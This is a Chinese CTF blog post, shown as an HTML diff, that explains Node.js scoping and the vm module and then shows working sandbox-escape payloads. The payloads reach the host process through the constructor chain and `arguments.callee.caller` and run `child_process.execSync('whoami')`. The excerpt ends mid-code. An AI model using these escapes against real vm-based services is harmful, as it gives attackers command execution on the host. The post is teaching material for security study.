@@ -1,0 +1,413 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Nodejs沙箱逃逸 | P4tt0n's b10g</title><meta name="author" content="P4tt0n"><meta name="copyright" content="P4tt0n"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Nodejs 沙箱逃逸沙箱简介​	     计算机世界的沙箱，实际上是对线下一种生活现象的虚拟化模拟。在现实生活中，孩子们会用木板在沙地或沙滩上围出一个方盒子，然后在里面用沙子堆砌、创造出各种形状，如城堡、房屋、山丘等。这个方盒子就是一个沙箱，它具有两个核心特点：一是有明确的边界，游戏和创造活动都被限制在这个边界内；二是使用沙子作为游戏材料，创造出来的任何东西都可以轻易地被抹平，不留痕迹。 ​">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Nodejs沙箱逃逸">
+<meta property="og:url" content="https://p4tt0n.github.io/2024/10/09/Nodejs%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/index.html">
+<meta property="og:site_name" content="P4tt0n&#39;s b10g">
+<meta property="og:description" content="Nodejs 沙箱逃逸沙箱简介​	     计算机世界的沙箱，实际上是对线下一种生活现象的虚拟化模拟。在现实生活中，孩子们会用木板在沙地或沙滩上围出一个方盒子，然后在里面用沙子堆砌、创造出各种形状，如城堡、房屋、山丘等。这个方盒子就是一个沙箱，它具有两个核心特点：一是有明确的边界，游戏和创造活动都被限制在这个边界内；二是使用沙子作为游戏材料，创造出来的任何东西都可以轻易地被抹平，不留痕迹。 ​">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg">
+<meta property="article:published_time" content="2024-10-09T14:03:51.000Z">
+<meta property="article:modified_time" content="2024-10-09T14:20:37.056Z">
+<meta property="article:author" content="P4tt0n">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg"><link rel="shortcut icon" href="https://pic.imge.cc/2024/08/01/66ab32dd0cc03.png"><link rel="canonical" href="https://p4tt0n.github.io/2024/10/09/Nodejs%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.14.0-b3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>(()=>{
+      const saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+      
+      window.btf = {
+        saveToLocal: saveToLocal,
+        getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+          script.src = url
+          script.async = true
+          script.onerror = reject
+          script.onload = script.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            script.onload = script.onreadystatechange = null
+            resolve()
+          }
+
+          Object.keys(attr).forEach(key => {
+            script.setAttribute(key, attr[key])
+          })
+
+          document.head.appendChild(script)
+        }),
+
+        getCSS: (url, id = false) => new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+          link.rel = 'stylesheet'
+          link.href = url
+          if (id) link.id = id
+          link.onerror = reject
+          link.onload = link.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            link.onload = link.onreadystatechange = null
+            resolve()
+          }
+          document.head.appendChild(link)
+        }),
+
+        addGlobalFn: (key, fn, name = false, parent = window) => {
+          const pjaxEnable = false
+          if (!pjaxEnable && key.startsWith('pjax')) return
+
+          const globalFn = parent.globalFn || {}
+          const keyObj = globalFn[key] || {}
+    
+          if (name && keyObj[name]) return
+    
+          name = name || Object.keys(keyObj).length
+          keyObj[name] = fn
+          globalFn[key] = keyObj
+          parent.globalFn = globalFn
+        }
+      }
+    
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+      
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })()</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":true,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Nodejs沙箱逃逸',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-10-09 22:20:37'
+}</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="./themes/butterfly/source/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', () => { preloader.initLoading() }, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', () => { preloader.endLoading() }, 'preloader_end')
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://pic2.zhimg.com/32098d0cc61d44d6151fb7614211d256_r.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="P4tt0n's b10g"><img class="site-icon" src="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" alt="Logo"/><span class="site-name">P4tt0n's b10g</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Nodejs沙箱逃逸</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-10-09T14:03:51.000Z" title="发表于 2024-10-09 22:03:51">2024-10-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-10-09T14:20:37.056Z" title="更新于 2024-10-09 22:20:37">2024-10-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>16分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Nodejs沙箱逃逸"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="Nodejs-沙箱逃逸"><a href="#Nodejs-沙箱逃逸" class="headerlink" title="Nodejs 沙箱逃逸"></a>Nodejs 沙箱逃逸</h2><h3 id="沙箱简介"><a href="#沙箱简介" class="headerlink" title="沙箱简介"></a>沙箱简介</h3><p>​	     计算机世界的沙箱，实际上是对线下一种生活现象的虚拟化模拟。在现实生活中，孩子们会用木板在沙地或沙滩上围出一个方盒子，然后在里面用沙子堆砌、创造出各种形状，如城堡、房屋、山丘等。这个方盒子就是一个沙箱，它具有两个核心特点：一是有明确的边界，游戏和创造活动都被限制在这个边界内；二是使用沙子作为游戏材料，创造出来的任何东西都可以轻易地被抹平，不留痕迹。</p>
+<p>​	     在计算机世界中，这种沙箱的概念被数字化模拟了出来。通过软硬件手段的结合，可以在一台设备（如服务器或手机）中模拟出一个“管控”区域。这个区域内部是预先指定和划分出来的运算与存储资源，与宿主设备的其他资源完全隔离。应用代码可以在这个模拟区域内运行，即使它是病毒、木马或DDoS攻击软件，也只能在这个资源受限的模拟世界中折腾，无法看到或影响宿主设备中的其他部分，更无法滥用宿主资源导致设备崩溃。此外，由于这个区域是模拟的，因此无论里面运行着什么，都可以一键删除，实现瞬间的清零。</p>
+<p>​	     简而言之，计算机世界的沙箱就是一种虚拟化技术，用于在安全的环境中运行和测试代码，防止恶意软件对宿主设备造成损害。</p>
+<p>​         在Node.js中，沙箱是一种重要的安全机制，它通过隔离和限制程序对系统资源的访问，为运行不信任的代码提供了一个安全的环境。通过<code>vm</code>模块或第三方库，开发者可以创建和管理沙箱，确保系统的安全性和稳定性，但同时也需要关注潜在的安全风险。</p>
+<h3 id="Nodejs的作用域"><a href="#Nodejs的作用域" class="headerlink" title="Nodejs的作用域"></a>Nodejs的作用域</h3><p>​         在Node.js的编程环境中，每个JavaScript文件都被视为一个独立的模块，它们各自拥有自己的私有作用域（或称为上下文）。这意味着，一个模块内部定义的变量、函数等默认情况下是无法被其他模块直接访问的。这种设计保证了模块之间的独立性和封装性，避免了全局命名空间的污染。</p>
+<h4 id="全局作用域（Global-Scope）"><a href="#全局作用域（Global-Scope）" class="headerlink" title="全局作用域（Global Scope）"></a>全局作用域（Global Scope）</h4><p>​        在Node.js中，<code>global</code>对象是一个全局对象，它的属性和方法在所有模块中都是可访问的。这包括了如<code>console</code>、<code>process</code>、<code>Buffer</code>等内置对象，以及任何直接添加到<code>global</code>对象上的自定义属性或方法。但是，通常不推荐在全局作用域中添加大量自定义变量或函数，因为这可能会导致命名冲突和难以追踪的错误。</p>
+<h4 id="模块作用域（Module-Scope）"><a href="#模块作用域（Module-Scope）" class="headerlink" title="模块作用域（Module Scope）"></a>模块作用域（Module Scope）</h4><p>​        每个Node.js文件都被视为一个独立的模块。这些模块拥有它们自己的作用域，也就是说，一个模块中的变量、函数等默认不会影响到其他模块。这种设计使得模块之间天然隔离，减少了相互之间的干扰。</p>
+<p>代码示例：</p>
+<p>(一)</p>
+<p>a.js</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> name = <span class="string">&#x27;P4tt0n&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>b.js</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> file = <span class="built_in">require</span>(<span class="string">&#x27;./a.js&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(file.<span class="property">name</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/30/hello-world/mage-20240727234655849.png" alt="image-20240727234655849"></p>
+<p>（二）</p>
+<p>a.js</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> name = <span class="string">&#x27;P4tt0n&#x27;</span></span><br><span class="line"><span class="built_in">exports</span>.<span class="property">name</span> = name</span><br></pre></td></tr></table></figure>
+
+<p>b.js</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> file = <span class="built_in">require</span>(<span class="string">&#x27;./a.js&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(file.<span class="property">name</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/30/hello-world/mage-20240727234756348.png" alt="image-20240727234756348"></p>
+<p>由此可见a.js和b.js不在同一个作用域，只有使用<code>require</code>将一个包中的模块引入到另一个包,才能实现功能的引用.而且这并不是把一个包中的所有变量和函数引入到另一个包,require只返回一个模块的导出对象，这取决于模块自身的 <code>module.exports</code> 或 <code>exports</code> 对象的设置</p>
+<p>（三）</p>
+<p>a.js</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">global</span>.<span class="property">name</span> = <span class="string">&#x27;P4tt0n&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>b.js</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> file = <span class="built_in">require</span>(<span class="string">&#x27;./a.js&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2024/07/30/hello-world/mage-20240727234756348.png" alt="image-20240727234756348"></p>
+<p>​         可见，我们输出<code>name</code>时，不需要使用file.name的形式，我们可以直接使用<code>name</code>进行输出，同时<code>name</code>也不需要使用<code>exports</code>进行导出，因为此时name已经挂载在global上了，它的作用域不在a.js中了。</p>
+<h3 id="VM沙箱"><a href="#VM沙箱" class="headerlink" title="VM沙箱"></a>VM沙箱</h3><p>​        上文介绍了作用域，vm模块就是通过定义一个全新的作用域，让代码在这个新的作用域中运行，这样就与其他作用域隔离了。</p>
+<p>接下来介绍一些vm模块的api</p>
+<ol>
+<li><p>vm.Script</p>
+<p> <code>new vm.Script(code[, options])</code>: 创建一个预编译的Script对象，表示一段JavaScript代码。</p>
+<p> <code>script.runInContext([contextifiedSandbox[, options]])</code>: 在指定的上下文中执行预编译的脚本。<code>script.runInNewContext([sandbox[, options]])</code>: 创建一个新的上下文并在其中执行脚本。</p>
+<p> vm.Script类型的实例包含若干预编译的脚本，这些脚本能够在特定的沙箱（或者上下文）中被运行。</p>
+</li>
+<li><p>vm.createContext([sandbox[, options]])</p>
+<p> 创建一个新的、独立的上下文（沙箱），可以包含预先定义的变量和函数。</p>
+<p> 使用前需要创建一个沙箱对象，再将沙箱对象传递给该方法（如果没有就会生成一个空的沙箱对象），v8为这个沙箱对象在当前的global外再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性</p>
+<p> 具体结构：</p>
+ <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable constant_">V8</span>&#123;</span><br><span class="line"> sandbox&#123;&#125;</span><br><span class="line"> <span class="variable language_">global</span>&#123;&#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p> 示例：</p>
+<p> c.js</p>
+ <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Node.js program to demonstrate the      </span></span><br><span class="line"><span class="comment">// vm.createContext([contextObject[, options]]) </span></span><br><span class="line"><span class="comment">// method </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">// Including util and vm module </span></span><br><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">&#x27;util&#x27;</span>); </span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>); </span><br><span class="line">  </span><br><span class="line"><span class="comment">// Assigning value to the global variable </span></span><br><span class="line"><span class="variable language_">global</span>.<span class="property">globalVar</span> = <span class="number">10</span>; </span><br><span class="line">  </span><br><span class="line"><span class="comment">// Defining Context object </span></span><br><span class="line"><span class="keyword">const</span> object = &#123; <span class="attr">globalVar</span>:<span class="number">4</span> &#125;; </span><br><span class="line">  </span><br><span class="line"><span class="comment">// Contextifying stated object </span></span><br><span class="line"><span class="comment">// using createContext method </span></span><br><span class="line">vm.<span class="title function_">createContext</span>(object); </span><br><span class="line">  </span><br><span class="line"><span class="comment">// Compiling code </span></span><br><span class="line">vm.<span class="title function_">runInContext</span>(<span class="string">&#x27;globalVar /= 2;&#x27;</span>, object); </span><br><span class="line">  </span><br><span class="line"><span class="comment">// Displays the context </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Context:&quot;</span>, object); </span><br><span class="line">  </span><br><span class="line"><span class="comment">// Dsiplays value of global variable </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Global Variable is &quot;</span>, <span class="variable language_">global</span>.<span class="property">globalVar</span>);</span><br></pre></td></tr></table></figure>
+
+<p> <img src="/2024/07/30/hello-world/mage-20240728213638733.png" alt="image-20240728213638733"></p>
+</li>
+<li><p>vm.runInContext(code, contextifiedSandbox[, options])</p>
+<p> 参数为要执行的代码和创建完作用域的上下文(沙箱对象)，代码会在传入和沙箱对象的上下文中执行，并且参数的值与沙箱内的参数值相同</p>
+<p> 示例d.js</p>
+ <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>)</span><br><span class="line"><span class="variable language_">global</span>.<span class="property">global_var</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;<span class="attr">global_var</span>: <span class="number">2</span>&#125; <span class="comment">//创建一个沙箱对象</span></span><br><span class="line">vm.<span class="title function_">createContext</span>(sandbox)  <span class="comment">//创建一个上下文对象</span></span><br><span class="line">vm.<span class="title function_">runInContext</span>(<span class="string">&#x27;global_var*=2&#x27;</span>,sandbox)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(sandbox)    <span class="comment">// &#123; global_var: 4 &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(global_var) <span class="comment">// 1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p> <img src="/2024/07/30/hello-world/mage-20240728214200798.png" alt="image-20240728214200798"></p>
+</li>
+<li><p>vm.runInNewContext(code[, sandbox[, options]])</p>
+<p> 创建一个新的上下文并在其中运行JavaScript代码。这个函数是<code>createContext()</code>和<code>runInContext()</code>的结合版，传入要执行的代码和沙箱对象</p>
+</li>
+<li><p>vm.runInThisContext(code[, options])</p>
+<p> 在当前上下文中运行JavaScript代码，代码可以直接访问当前作用域的变量。<code>sandbox</code>沙箱中可以访问到global中的属性，但是无法访问其他包的属性。（无法访问本地的属性)</p>
+<p> 示例e.js</p>
+ <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Node.js program to demonstrate the      </span></span><br><span class="line"><span class="comment">// runInThisContext() method </span></span><br><span class="line">   </span><br><span class="line"><span class="comment">// Including vm module </span></span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>); </span><br><span class="line">   </span><br><span class="line"><span class="comment">// Declaring local variable </span></span><br><span class="line"><span class="keyword">let</span> localVar = <span class="string">&#x27;GYH&#x27;</span>; </span><br><span class="line">   </span><br><span class="line"><span class="comment">// Calling runInThisContext method </span></span><br><span class="line"><span class="keyword">const</span> vmresult = </span><br><span class="line"> vm.<span class="title function_">runInThisContext</span>(<span class="string">&#x27;localVar = &quot;P4tt0n&quot;;&#x27;</span>); </span><br><span class="line">   </span><br><span class="line"><span class="comment">// Prints output for vmresult </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`vmresult:&#x27;<span class="subst">$&#123;vmresult&#125;</span>&#x27;,  </span></span><br><span class="line"><span class="string">              localVar:&#x27;<span class="subst">$&#123;localVar&#125;</span>&#x27;`</span>); </span><br><span class="line">   </span><br><span class="line"><span class="comment">// Constructing eval </span></span><br><span class="line"><span class="keyword">const</span> evalresult = <span class="built_in">eval</span>(<span class="string">&#x27;localVar = &quot;LZ&quot;;&#x27;</span>); </span><br><span class="line">   </span><br><span class="line"><span class="comment">// Prints output for evalresult </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`evalresult:&#x27;<span class="subst">$&#123;evalresult&#125;</span>&#x27;,  </span></span><br><span class="line"><span class="string">                localVar:&#x27;<span class="subst">$&#123;localVar&#125;</span>&#x27;`</span>);</span><br></pre></td></tr></table></figure>
+
+<p> <img src="/2024/07/30/hello-world/mage-20240728214808336.png" alt="image-20240728214808336"></p>
+</li>
+<li><p>vm.createScript(code[, options])</p>
+<p> （过时，从Node.js v0.12开始不再推荐使用）创建一个可执行的Script对象。</p>
+</li>
+</ol>
+<h3 id="VM沙箱逃逸"><a href="#VM沙箱逃逸" class="headerlink" title="VM沙箱逃逸"></a>VM沙箱逃逸</h3><p>举一个例子</p>
+<p>f.js</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> a = vm.<span class="title function_">runInNewContext</span>(<span class="string">`this.constructor.constructor(&#x27;return global&#x27;)()`</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">process</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2024/07/30/hello-world/mage-20240728225406813.png" alt="image-20240728225406813"></p>
+<p>​        很明显是逃逸出去了。如何做到的？debug跟进一下</p>
+<p><img src="/2024/07/30/hello-world/mage-20240728230600603.png" alt="image-20240728230600603"></p>
+<p><img src="/2024/07/30/hello-world/mage-20240728230628146.png" alt="image-20240728230628146">		   <img src="/2024/07/30/hello-world/mage-20240728230641958.png" alt="image-20240728230641958"></p>
+<p><img src="/2024/07/30/hello-world/mage-20240728230658141.png" alt="image-20240728230658141"></p>
+<p><img src="/2024/07/30/hello-world/mage-20240728230711056.png" alt="image-20240728230711056"></p>
+<p><img src="/2024/07/30/hello-world/mage-20240728230746658.png" alt="image-20240728230746658"></p>
+<p><img src="/2024/07/30/hello-world/mage-20240728230758946.png" alt="image-20240728230758946"></p>
+<p>​         这里的this是指向传递到runInNewContext函数的一个对象，他是不属于沙箱内部环境的，访问当前对象的构造器的构造器，也就是Function的构造器，由于继承关系，它的作用域是全局变量，执行代码，获取外部global。拿到process对象就可以执行命令了。</p>
+<p>constructor的理解</p>
+<p>示例：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">PP</span>(<span class="params"></span>)&#123;</span><br><span class="line">    name : <span class="string">&#x27;P4tt0n&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> a= <span class="keyword">new</span> <span class="title function_">PP</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">constructor</span>);<span class="comment">//PP</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">constructor</span>.<span class="property">constructor</span>);<span class="comment">//Function</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="绕过Object-create-null"><a href="#绕过Object-create-null" class="headerlink" title="绕过Object.create(null)"></a>绕过Object.create(null)</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> script = <span class="string">`...`</span>;</span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">const</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">const</span> res = vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello &#x27;</span> + res)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/30/hello-world/mage-20240728232613904.png" alt="image-20240728232613904"></p>
+<p>​         我们现在的this为null，并且也没有其他可以引用的对象，这时候想要逃逸我们要用到一个函数中的内置对象的属性arguments.callee.caller，它可以返回函数的调用者。我们只要在沙箱内定义一个函数，然后在沙箱外调用这个函数，那么这个函数的arguments.callee.caller就会返回沙箱外的一个对象，我们在沙箱内就可以进行逃逸了。</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> script =</span><br><span class="line"><span class="string">`(() =&gt; &#123;</span></span><br><span class="line"><span class="string">    const a = &#123;&#125;</span></span><br><span class="line"><span class="string">    a.toString = function () &#123;</span></span><br><span class="line"><span class="string">      const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">      const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">      return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    return a</span></span><br><span class="line"><span class="string">  &#125;)()`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">const</span> context = <span class="keyword">new</span> vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">const</span> res = vm.<span class="title 